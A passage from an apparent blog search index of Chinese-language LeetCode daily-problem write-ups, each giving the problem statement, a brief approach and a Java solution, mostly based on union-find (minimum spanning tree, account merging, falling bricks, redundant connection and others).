    <content type="text"><![CDATA[题目：1584. 连接所有点的最小费用难度：中等 给你一个points 数组，表示 2D 平面上的一些点，其中 points[i] = [xi, yi] 。 连接点 [xi, yi] 和点 [xj, yj] 的费用为它们之间的 曼哈顿距离 ：|xi - xj| + |yi - yj| ，其中 |val| 表示 val 的绝对值。 请你返回将所有点连接的最小总费用。只有任意两点之间 有且仅有 一条简单路径时，才认为所有点都已连接。 示例 1： 123456输入：points = [[0,0],[2,2],[3,10],[5,2],[7,0]]输出：20解释：我们可以按照上图所示连接所有点得到最小总费用，总费用为 20 。注意到任意两个点之间只有唯一一条路径互相到达。 示例 2： 12输入：points = [[3,12],[-2,5],[-4,1]]输出：18 示例 3： 12输入：points = [[0,0],[1,1],[1,0],[-1,1]]输出：4 示例 4： 12输入：points = [[-1000000,-1000000],[1000000,1000000]]输出：4000000 示例 5： 12输入：points = [[0,0]]输出：0 提示： 1 &lt;= points.length &lt;= 1000 -106 &lt;= xi, yi &lt;= 106 所有点 (xi, yi) 两两不同。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/min-cost-to-connect-all-points/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 看出来这题是考最小生成树算法就好办了，直接上Kruskal算法 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778class Solution &#123; public int minCostConnectPoints(int[][] points) &#123; int ans = 0; List&lt;Edge&gt; edges = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; points.length;i++) &#123; for (int j = i + 1;j &lt; points.length;j++) &#123; int dict = dict(points[i],points[j]); edges.add(new Edge(i,j,dict)); &#125; &#125; Collections.sort(edges); UF u = new UF(points.length); for (Edge e : edges) &#123; if (u.union(e.s,e.e)) &#123; ans += e.dict; &#125; &#125; return ans; &#125; public int dict(int[] p1,int[] p2) &#123; return Math.abs(p1[0] - p2[0]) + Math.abs(p1[1] - p2[1]); &#125; class UF &#123; int[] parents; public UF(int n) &#123; parents = new int[n]; for (int i = 0;i &lt; n;i++) &#123; parents[i] = i; &#125; &#125; public int find(int x) &#123; if (x != parents[x]) &#123; parents[x] = find(parents[x]); &#125; return parents[x]; &#125; public boolean union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return false; &#125; parents[rootX] = rootY; return true; &#125; public String toString() &#123; return Arrays.toString(parents); &#125; &#125; class Edge implements Comparable&lt;Edge&gt; &#123; int s; int e; int dict; public Edge(int s,int e,int dict) &#123; this.s = s; this.e = e; this.dict = dict; &#125; public int compareTo(Edge e) &#123; return dict - e.dict; &#125; public String toString() &#123; return "&#123;s = " + s + ", e = " + e + ", dict = " + dict + "&#125;"; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>并查集</tag>
        <tag>Kruskal算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/18]]></title>
    <url>%2Fposts%2Fd5f24517%2F</url>
    <content type="text"><![CDATA[题目：721. 账户合并难度：中等 给定一个列表 accounts，每个元素 accounts[i] 是一个字符串列表，其中第一个元素 accounts[i][0] 是 名称 (name)，其余元素是 emails 表示该账户的邮箱地址。 现在，我们想合并这些账户。如果两个账户都有一些共同的邮箱地址，则两个账户必定属于同一个人。请注意，即使两个账户具有相同的名称，它们也可能属于不同的人，因为人们可能具有相同的名称。一个人最初可以拥有任意数量的账户，但其所有账户都具有相同的名称。 合并账户后，按以下格式返回账户：每个账户的第一个元素是名称，其余元素是按顺序排列的邮箱地址。账户本身可以以任意顺序返回。 示例 1： 123456789输入：accounts = [[&quot;John&quot;, &quot;johnsmith@mail.com&quot;, &quot;john00@mail.com&quot;], [&quot;John&quot;, &quot;johnnybravo@mail.com&quot;], [&quot;John&quot;, &quot;johnsmith@mail.com&quot;, &quot;john_newyork@mail.com&quot;], [&quot;Mary&quot;, &quot;mary@mail.com&quot;]]输出：[[&quot;John&quot;, &apos;john00@mail.com&apos;, &apos;john_newyork@mail.com&apos;, &apos;johnsmith@mail.com&apos;], [&quot;John&quot;, &quot;johnnybravo@mail.com&quot;], [&quot;Mary&quot;, &quot;mary@mail.com&quot;]]解释：第一个和第三个 John 是同一个人，因为他们有共同的邮箱地址 &quot;johnsmith@mail.com&quot;。 第二个 John 和 Mary 是不同的人，因为他们的邮箱地址没有被其他帐户使用。可以以任何顺序返回这些列表，例如答案 [[&apos;Mary&apos;，&apos;mary@mail.com&apos;]，[&apos;John&apos;，&apos;johnnybravo@mail.com&apos;]，[&apos;John&apos;，&apos;john00@mail.com&apos;，&apos;john_newyork@mail.com&apos;，&apos;johnsmith@mail.com&apos;]] 也是正确的。 提示： accounts的长度将在[1，1000]的范围内。 accounts[i]的长度将在[1，10]的范围内。 accounts[i][j]的长度将在[1，30]的范围内。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/accounts-merge/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 不学会并查集誓不罢休 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778class Solution &#123; public List&lt;List&lt;String&gt;&gt; accountsMerge(List&lt;List&lt;String&gt;&gt; accounts) &#123; Map&lt;String,Integer&gt; emailToIndex = new HashMap&lt;&gt;(); List&lt;String&gt; names = new ArrayList&lt;&gt;(); int cnt = 0; for (List&lt;String&gt; account : accounts) &#123; String name = account.get(0); for (int i = 1;i &lt; account.size();i++) &#123; String email = account.get(i); if (!emailToIndex.containsKey(email)) &#123; names.add(name); emailToIndex.put(email,cnt++); &#125; &#125; &#125; UF u = new UF(cnt); for (List&lt;String&gt; account : accounts) &#123; int index = emailToIndex.get(account.get(1)); for (int i = 2;i &lt; account.size();i++) &#123; u.union(index,emailToIndex.get(account.get(i))); &#125; &#125; Map&lt;Integer,List&lt;String&gt;&gt; indexToEmails = new HashMap&lt;&gt;(); for (String email : emailToIndex.keySet()) &#123; int index = u.find(emailToIndex.get(email)); List&lt;String&gt; account = indexToEmails.getOrDefault(index, new ArrayList&lt;String&gt;()); account.add(email); indexToEmails.put(index, account); &#125; List&lt;List&lt;String&gt;&gt; ans = new ArrayList&lt;&gt;(); for (List&lt;String&gt; emails : indexToEmails.values()) &#123; Collections.sort(emails); String name = names.get(emailToIndex.get(emails.get(0))); List&lt;String&gt; account = new ArrayList&lt;&gt;(); account.add(name); account.addAll(emails); ans.add(account); &#125; return ans; &#125; class UF &#123; int[] parent; public UF(int n) &#123; parent = new int[n]; for (int i = 0;i &lt; n;i++) &#123; parent[i] = i; &#125; &#125; public int find(int x) &#123; if (x != parent[x]) &#123; parent[x] = find(parent[x]); &#125; return parent[x]; &#125; public void union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return; &#125; parent[rootX] = rootY; &#125; public String toString() &#123; return Arrays.toString(parent); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/17]]></title>
    <url>%2Fposts%2F454d5886%2F</url>
    <content type="text"><![CDATA[题目：1232. 缀点成线难度：简单 在一个 XY 坐标系中有一些点，我们用数组 coordinates 来分别记录它们的坐标，其中 coordinates[i] = [x, y] 表示横坐标为 x、纵坐标为 y 的点。 请你来判断，这些点是否在该坐标系中属于同一条直线上，是则返回 true，否则请返回 false。 示例 1： 12输入：coordinates = [[1,2],[2,3],[3,4],[4,5],[5,6],[6,7]]输出：true 示例 2： 12输入：coordinates = [[1,1],[2,2],[3,4],[4,5],[5,6],[7,7]]输出：false 提示： 2 &lt;= coordinates.length &lt;= 1000 coordinates[i].length == 2 -10^4 &lt;= coordinates[i][0], coordinates[i][1] &lt;= 10^4 coordinates 中不含重复的点 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/check-if-it-is-a-straight-line/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 任意两点，可构成线，而同在一条直线上的点斜率相同，因此，选两个点做参考系，然后判断其他点是否在直线上即可，而由于计算斜率时可能出现分母为0的情况，因此将其变形成乘法式 解题代码123456789101112131415161718192021222324class Solution &#123; public boolean checkStraightLine(int[][] coordinates) &#123; if (coordinates.length == 2) &#123; return true; &#125; p1 = coordinates[0]; p2 = coordinates[1]; for (int i = 2;i &lt; coordinates.length;i++) &#123; if (!isLine(coordinates[i])) &#123; return false; &#125; &#125; return true; &#125; int[] p1; int[] p2; private boolean isLine(int[] p) &#123; return (p[0] - p1[0]) * (p[1] - p2[1]) == (p[0] - p2[0]) * (p[1] - p1[1]); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>数学</tag>
        <tag>几何</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/16]]></title>
    <url>%2Fposts%2F324a6810%2F</url>
    <content type="text"><![CDATA[题目：803. 打砖块难度：困难 有一个 m x n 的二元网格，其中 1 表示砖块，0 表示空白。砖块 稳定 （不会掉落）的前提是： 一块砖直接连接到网格的顶部，或者 至少有一块相邻（4 个方向之一）砖块 稳定 不会掉落时 给你一个数组 hits ，这是需要依次消除砖块的位置。每当消除 hits[i] = (rowi, coli) 位置上的砖块时，对应位置的砖块（若存在）会消失，然后其他的砖块可能因为这一消除操作而掉落。一旦砖块掉落，它会立即从网格中消失（即，它不会落在其他稳定的砖块上）。 返回一个数组 result ，其中 result[i] 表示第 i 次消除操作对应掉落的砖块数目。 注意 ，消除可能指向是没有砖块的空白位置，如果发生这种情况，则没有砖块掉落。 示例 1： 12345678910111213输入：grid = [[1,0,0,0],[1,1,1,0]], hits = [[1,0]]输出：[2]解释：网格开始为：[[1,0,0,0]， [1,1,1,0]]消除 (1,0) 处加粗的砖块，得到网格：[[1,0,0,0] [0,1,1,0]]两个加粗的砖不再稳定，因为它们不再与顶部相连，也不再与另一个稳定的砖相邻，因此它们将掉落。得到网格：[[1,0,0,0], [0,0,0,0]]因此，结果为 [2] 。 示例 2： 1234567891011121314151617输入：grid = [[1,0,0,0],[1,1,0,0]], hits = [[1,1],[1,0]]输出：[0,0]解释：网格开始为：[[1,0,0,0], [1,1,0,0]]消除 (1,1) 处加粗的砖块，得到网格：[[1,0,0,0], [1,0,0,0]]剩下的砖都很稳定，所以不会掉落。网格保持不变：[[1,0,0,0], [1,0,0,0]]接下来消除 (1,0) 处加粗的砖块，得到网格：[[1,0,0,0], [0,0,0,0]]剩下的砖块仍然是稳定的，所以不会有砖块掉落。因此，结果为 [0,0] 。 提示： m == grid.length n == grid[i].length 1 &lt;= m, n &lt;= 200 grid[i][j] 为 0 或 1 1 &lt;= hits.length &lt;= 4 * 104 hits[i].length == 2 0 &lt;= xi &lt;= m - 1 0 &lt;= yi &lt;= n - 1 所有 (xi, yi) 互不相同 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/bricks-falling-when-hit/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 逆向思维 学到了 正向考虑的bfs超时了 解题代码逆向 + 并查集 复制粘贴的 A了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170public class Solution &#123; private int rows; private int cols; public static final int[][] DIRECTIONS = &#123;&#123;0, 1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, -1&#125;&#125;; public int[] hitBricks(int[][] grid, int[][] hits) &#123; this.rows = grid.length; this.cols = grid[0].length; // 第 1 步：把 grid 中的砖头全部击碎，通常算法问题不能修改输入数据，这一步非必需，可以认为是一种答题规范 int[][] copy = new int[rows][cols]; for (int i = 0; i &lt; rows; i++) &#123; for (int j = 0; j &lt; cols; j++) &#123; copy[i][j] = grid[i][j]; &#125; &#125; // 把 copy 中的砖头全部击碎 for (int[] hit : hits) &#123; copy[hit[0]][hit[1]] = 0; &#125; // 第 2 步：建图，把砖块和砖块的连接关系输入并查集，size 表示二维网格的大小，也表示虚拟的「屋顶」在并查集中的编号 int size = rows * cols; UnionFind unionFind = new UnionFind(size + 1); // 将下标为 0 的这一行的砖块与「屋顶」相连 for (int j = 0; j &lt; cols; j++) &#123; if (copy[0][j] == 1) &#123; unionFind.union(j, size); &#125; &#125; // 其余网格，如果是砖块向上、向左看一下，如果也是砖块，在并查集中进行合并 for (int i = 1; i &lt; rows; i++) &#123; for (int j = 0; j &lt; cols; j++) &#123; if (copy[i][j] == 1) &#123; // 如果上方也是砖块 if (copy[i - 1][j] == 1) &#123; unionFind.union(getIndex(i - 1, j), getIndex(i, j)); &#125; // 如果左边也是砖块 if (j &gt; 0 &amp;&amp; copy[i][j - 1] == 1) &#123; unionFind.union(getIndex(i, j - 1), getIndex(i, j)); &#125; &#125; &#125; &#125; // 第 3 步：按照 hits 的逆序，在 copy 中补回砖块，把每一次因为补回砖块而与屋顶相连的砖块的增量记录到 res 数组中 int hitsLen = hits.length; int[] res = new int[hitsLen]; for (int i = hitsLen - 1; i &gt;= 0; i--) &#123; int x = hits[i][0]; int y = hits[i][1]; // 注意：这里不能用 copy，语义上表示，如果原来在 grid 中，这一块是空白，这一步不会产生任何砖块掉落 // 逆向补回的时候，与屋顶相连的砖块数量也肯定不会增加 if (grid[x][y] == 0) &#123; continue; &#125; // 补回之前与屋顶相连的砖块数 int origin = unionFind.getSize(size); // 注意：如果补回的这个结点在第 1 行，要告诉并查集它与屋顶相连（逻辑同第 2 步） if (x == 0) &#123; unionFind.union(y, size); &#125; // 在 4 个方向上看一下，如果相邻的 4 个方向有砖块，合并它们 for (int[] direction : DIRECTIONS) &#123; int newX = x + direction[0]; int newY = y + direction[1]; if (inArea(newX, newY) &amp;&amp; copy[newX][newY] == 1) &#123; unionFind.union(getIndex(x, y), getIndex(newX, newY)); &#125; &#125; // 补回之后与屋顶相连的砖块数 int current = unionFind.getSize(size); // 减去的 1 是逆向补回的砖块（正向移除的砖块），与 0 比较大小，是因为存在一种情况，添加当前砖块，不会使得与屋顶连接的砖块数更多 res[i] = Math.max(0, current - origin - 1); // 真正补上这个砖块 copy[x][y] = 1; &#125; return res; &#125; /** * 输入坐标在二维网格中是否越界 * * @param x * @param y * @return */ private boolean inArea(int x, int y) &#123; return x &gt;= 0 &amp;&amp; x &lt; rows &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; cols; &#125; /** * 二维坐标转换为一维坐标 * * @param x * @param y * @return */ private int getIndex(int x, int y) &#123; return x * cols + y; &#125; private class UnionFind &#123; /** * 当前结点的父亲结点 */ private int[] parent; /** * 以当前结点为根结点的子树的结点总数 */ private int[] size; public UnionFind(int n) &#123; parent = new int[n]; size = new int[n]; for (int i = 0; i &lt; n; i++) &#123; parent[i] = i; size[i] = 1; &#125; &#125; /** * 路径压缩，只要求每个不相交集合的「根结点」的子树包含的结点总数数值正确即可，因此在路径压缩的过程中不用维护数组 size * * @param x * @return */ public int find(int x) &#123; if (x != parent[x]) &#123; parent[x] = find(parent[x]); &#125; return parent[x]; &#125; public void union(int x, int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return; &#125; parent[rootX] = rootY; // 在合并的时候维护数组 size size[rootY] += size[rootX]; &#125; /** * @param x * @return x 在并查集的根结点的子树包含的结点总数 */ public int getSize(int x) &#123; int root = find(x); return size[root]; &#125; &#125;&#125; 正向 + bfs 自己写的 超时 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071class Solution &#123; public int[] hitBricks(int[][] grid, int[][] hits) &#123; int[] ans = new int[hits.length]; int index = 0; for (int[] h : hits) &#123; grid[h[0]][h[1]] = 0; boolean[][] flag = new boolean[grid.length][grid[0].length]; update(grid,flag); // print(grid); // print(flag); int cnt = 0; for (int i = 0;i &lt; flag.length;i++) &#123; for (int j = 0;j &lt; flag[i].length;j++) &#123; if (!flag[i][j] &amp;&amp; grid[i][j] == 1) &#123; grid[i][j] = 0; cnt++; &#125; &#125; &#125; ans[index++] = cnt; &#125; return ans; &#125; int[][] dir = &#123; &#123;0,-1&#125;, &#123;0,1&#125;, &#123;-1,0&#125;, &#123;1,0&#125; &#125;; private void update(int[][] grid,boolean[][] flag) &#123; for (int i = 0;i &lt; grid[0].length;i++) &#123; bfs(grid,flag,0,i); &#125; &#125; private void bfs(int[][] grid,boolean[][] flag,int x,int y) &#123; Queue&lt;int[]&gt; q = new LinkedList&lt;&gt;(); if (grid[x][y] == 1) &#123; flag[x][y] = true; q.add(new int[]&#123;x,y&#125;); &#125; while (!q.isEmpty()) &#123; int[] p = q.poll(); for (int i = 0;i &lt; dir.length;i++) &#123; int nextX = p[0] + dir[i][0]; int nextY = p[1] + dir[i][1]; if (nextX &gt;= 0 &amp;&amp; nextX &lt; grid.length &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; grid[nextX].length &amp;&amp; grid[nextX][nextY] == 1 &amp;&amp; !flag[nextX][nextY]) &#123; q.add(new int[]&#123;nextX,nextY&#125;); flag[nextX][nextY] = true; &#125; &#125; &#125; &#125; private void print(int[][] o) &#123; for (int i = 0;i &lt; o.length;i++) &#123; System.out.println(Arrays.toString(o[i])); &#125; &#125; private void print(boolean[][] o) &#123; for (int i = 0;i &lt; o.length;i++) &#123; System.out.println(Arrays.toString(o[i])); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/15]]></title>
    <url>%2Fposts%2Fab4339aa%2F</url>
    <content type="text"><![CDATA[题目：947. 移除最多的同行或同列石头难度：中等 n 块石头放置在二维平面中的一些整数坐标点上。每个坐标点上最多只能有一块石头。 如果一块石头的 同行或者同列 上有其他石头存在，那么就可以移除这块石头。 给你一个长度为 n 的数组 stones ，其中 stones[i] = [xi, yi] 表示第 i 块石头的位置，返回 可以移除的石子 的最大数量。 示例 1： 123456789输入：stones = [[0,0],[0,1],[1,0],[1,2],[2,1],[2,2]]输出：5解释：一种移除 5 块石头的方法如下所示：1. 移除石头 [2,2] ，因为它和 [2,1] 同行。2. 移除石头 [2,1] ，因为它和 [0,1] 同列。3. 移除石头 [1,2] ，因为它和 [1,0] 同行。4. 移除石头 [1,0] ，因为它和 [0,0] 同列。5. 移除石头 [0,1] ，因为它和 [0,0] 同行。石头 [0,0] 不能移除，因为它没有与另一块石头同行/列。 示例 2： 1234567输入：stones = [[0,0],[0,2],[1,1],[2,0],[2,2]]输出：3解释：一种移除 3 块石头的方法如下所示：1. 移除石头 [2,2] ，因为它和 [2,0] 同行。2. 移除石头 [2,0] ，因为它和 [0,0] 同列。3. 移除石头 [0,2] ，因为它和 [0,0] 同行。石头 [0,0] 和 [1,1] 不能移除，因为它们没有与另一块石头同行/列。 示例 3： 123输入：stones = [[0,0]]输出：0解释：[0,0] 是平面上唯一一块石头，所以不可以移除它。 提示： 1 &lt;= stones.length &lt;= 1000 0 &lt;= xi, yi &lt;= 104 不会有两块石头放在同一个坐标点上 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 只要想清楚这题是在求连通分量的数量 就会自然的想到利用各种数据结构或者算法去解决这题，比如dfs，bfs，并查集等 解题代码并查集解法，本质上并查集是一维数组，因此要想办法将2维坐标映射为1维的 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution &#123; public int removeStones(int[][] stones) &#123; int n = stones.length; UF u = new UF(); for (int[] s : stones) &#123; u.union(s[0] + 10001,s[1]); &#125; return n - u.cnt; &#125; class UF &#123; Map&lt;Integer,Integer&gt; parents; int cnt; public UF() &#123; parents = new HashMap&lt;&gt;(); cnt = 0; &#125; public int find(int x) &#123; if (!parents.containsKey(x)) &#123; parents.put(x,x); cnt++; &#125; if (x != parents.get(x)) &#123; parents.put(x,find(parents.get(x))); &#125; return parents.get(x); &#125; public void union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return; &#125; parents.put(rootX,rootY); cnt--; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/14]]></title>
    <url>%2Fposts%2Fdc44093c%2F</url>
    <content type="text"><![CDATA[题目：1018. 可被 5 整除的二进制前缀难度：简单 给定由若干 0 和 1 组成的数组 A。我们定义 N_i：从 A[0] 到 A[i] 的第 i 个子数组被解释为一个二进制数（从最高有效位到最低有效位）。 返回布尔值列表 answer，只有当 N_i 可以被 5 整除时，答案 answer[i] 为 true，否则为 false。 示例 1： 1234输入：[0,1,1]输出：[true,false,false]解释：输入数字为 0, 01, 011；也就是十进制中的 0, 1, 3 。只有第一个数可以被 5 整除，因此 answer[0] 为真。 示例 2： 12输入：[1,1,1]输出：[false,false,false] 示例 3： 12输入：[0,1,1,1,1,1]输出：[true,false,false,false,true,false] 示例 4： 12输入：[1,1,1,0,1]输出：[false,false,false,false,false] 提示： 1 &lt;= A.length &lt;= 30000 A[i] 为 0 或 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-prefix-divisible-by-5/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 没想到这题中，我的评论成为了精选评论，所以就直接搬砖了吧 解题代码123456789101112131415class Solution &#123; public List&lt;Boolean&gt; prefixesDivBy5(int[] A) &#123; List&lt;Boolean&gt; ans = new ArrayList&lt;&gt;(); int num = 0; for (int i = 0;i &lt; A.length;i++) &#123; num &lt;&lt;= 1; num += A[i]; num %= 10; ans.add(num % 5 == 0); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>位运算</tag>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/13]]></title>
    <url>%2Fposts%2F42209c9f%2F</url>
    <content type="text"><![CDATA[题目：684. 冗余连接难度：中等 在本问题中, 树指的是一个连通且无环的无向 图。 输入一个图，该图由一个有着N个节点 (节点值不重复1, 2, …, N) 的树及一条附加的边构成。附加的边的两个顶点包含在1到N中间，这条附加的边不属于树中已存在的边。 结果图是一个以边组成的二维数组。每一个边的元素是一对[u, v] ，满足 u &lt; v，表示连接顶点u 和v的无向 图的边。 返回一条可以删去的边，使得结果图是一个有着N个节点的树。如果有多个答案，则返回二维数组中最后出现的边。答案边 [u, v] 应满足相同的格式 u &lt; v。 示例 1： 123456输入: [[1,2], [1,3], [2,3]]输出: [2,3]解释: 给定的无向图为: 1 / \2 - 3 示例 2： 123456输入: [[1,2], [2,3], [3,4], [1,4], [1,5]]输出: [1,4]解释: 给定的无向图为:5 - 1 - 2 | | 4 - 3 注意: 输入的二维数组大小在 3 到 1000。 二维数组中的整数在1到N之间，其中N是输入数组的大小。 更新(2017-09-26): 我们已经重新检查了问题描述及测试用例，明确图是无向 ** 图。对于有向图详见冗余连接II。** 对于造成任何不便，我们深感歉意。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/redundant-connection/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 建立并查集的过程中判断有没有环出现即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123; public int[] findRedundantConnection(int[][] edges) &#123; UF u = new UF(edges.length); for (int[] e : edges) &#123; if (u.union(e[0],e[1])) &#123; return e; &#125; &#125; return null; &#125; class UF &#123; int[] parents; public UF(int n) &#123; parents = new int[n + 1]; for (int i = 1;i &lt;= n;i++) &#123; parents[i] = i; &#125; &#125; public boolean union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return true; &#125; parents[rootX] = rootY; return false; &#125; public int find(int x) &#123; if (x != parents[x]) &#123; parents[x] = find(parents[x]); &#125; return parents[x]; &#125; public String toString() &#123; return Arrays.toString(parents); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>图</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/11]]></title>
    <url>%2Fposts%2Fac2efdb3%2F</url>
    <content type="text"><![CDATA[题目：1202. 交换字符串中的元素难度：中等 给你一个字符串 s，以及该字符串中的一些「索引对」数组 pairs，其中 pairs[i] = [a, b] 表示字符串中的两个索引（编号从 0 开始）。 你可以 任意多次交换 在 pairs 中任意一对索引处的字符。 返回在经过若干次交换后，s 可以变成的按字典序最小的字符串。 示例 1: 12345输入：s = &quot;dcab&quot;, pairs = [[0,3],[1,2]]输出：&quot;bacd&quot;解释： 交换 s[0] 和 s[3], s = &quot;bcad&quot;交换 s[1] 和 s[2], s = &quot;bacd&quot; 示例 2： 123456输入：s = &quot;dcab&quot;, pairs = [[0,3],[1,2],[0,2]]输出：&quot;abcd&quot;解释：交换 s[0] 和 s[3], s = &quot;bcad&quot;交换 s[0] 和 s[2], s = &quot;acbd&quot;交换 s[1] 和 s[2], s = &quot;abcd&quot; 示例 3： 123456输入：s = &quot;cba&quot;, pairs = [[0,1],[1,2]]输出：&quot;abc&quot;解释：交换 s[0] 和 s[1], s = &quot;bca&quot;交换 s[1] 和 s[2], s = &quot;bac&quot;交换 s[0] 和 s[1], s = &quot;abc&quot; 提示： 1 &lt;= s.length &lt;= 10^5 0 &lt;= pairs.length &lt;= 10^5 0 &lt;= pairs[i][0], pairs[i][1] &lt; s.length s 中只含有小写英文字母 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/smallest-string-with-swaps/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 这个题其实就是先分组，然后进行组内排序就可以了，分组借助并查集实现 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class Solution &#123; public String smallestStringWithSwaps(String s, List&lt;List&lt;Integer&gt;&gt; pairs) &#123; char[] arr = s.toCharArray(); // 分组 Union u = new Union(s.length()); for (List&lt;Integer&gt; pair : pairs) &#123; u.union(pair.get(0),pair.get(1)); &#125; // 只有一个组的时候，直接排序后返回结果即可 if (u.cnt == 1) &#123; Arrays.sort(arr); return new String(arr); &#125; // 当有多个组时，按下面的步骤 // 建立索引 Map&lt;Integer,List&lt;Integer&gt;&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; arr.length;i++) &#123; int root = u.find(i); if (map.containsKey(root)) &#123; List&lt;Integer&gt; temp = map.get(root); temp.add(i); map.put(root,temp); &#125; else &#123; List&lt;Integer&gt; temp = new ArrayList&lt;&gt;(); temp.add(i); map.put(root,temp); &#125; &#125; // 组内排序，并写回结果 for (int k : map.keySet()) &#123; List&lt;Integer&gt; index = map.get(k); char[] temp = new char[index.size()]; for (int i = 0;i &lt; index.size();i++) &#123; temp[i] = arr[index.get(i)]; &#125; Arrays.sort(temp); for (int i = 0;i &lt; index.size();i++) &#123; arr[index.get(i)] = temp[i]; &#125; &#125; return new String(arr); &#125; class Union&#123; int cnt; int parents[]; public Union(int n) &#123; parents = new int[n]; cnt = n; for (int i = 0;i &lt; n;i++) &#123; parents[i] = i; &#125; &#125; public int find(int x) &#123; if (x != parents[x]) &#123; parents[x] = find(parents[x]); &#125; return parents[x]; &#125; public void union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return; &#125; parents[rootX] = rootY; cnt--; &#125; public String toString() &#123; return cnt + "," + Arrays.toString(parents); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/10]]></title>
    <url>%2Fposts%2Fdb29cd25%2F</url>
